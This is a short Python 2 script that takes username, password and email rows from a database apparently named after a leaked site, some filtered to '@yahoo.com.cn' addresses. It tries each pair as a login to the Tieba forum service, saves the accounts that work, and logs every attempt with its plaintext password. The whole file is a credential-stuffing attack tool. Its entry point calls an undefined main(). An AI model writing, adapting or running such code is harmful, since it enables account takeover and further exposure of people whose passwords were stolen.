# -*- coding: utf-8 -*-

import random

from mydb import csdndb, myuserdb
from tieba import Tieba, TiebaError

def try_login():
    log=open('./login.log', 'w+')
    mydb = csdndb()
    userdb = myuserdb()
    n = 200
    for row in mydb.get_random_rows(100, "%@yahoo.com.cn"):
    # for row in mydb.get_random_rows(100):
        username = row[0].encode('utf-8')
        passwd = row[1].encode('utf-8')
        email = row[2].encode('utf-8')
        n -= 1
        try:
            Tieba(username, passwd).login()
            print username+'\t'+passwd+"\t"+"登录成功"
            userdb.add_bd_user(username, passwd, email)
            log.write(username+'\t'+passwd+"\t"+"登录成功\n")
        except TiebaError, e:
            print str(n) + username+'\t'+passwd+"\t"+email+"\t"+str(e)
            log.write(username+'\t'+passwd+"\t"+email+"\t"+str(e)+"\n")





if __name__ == "__main__":
    main()
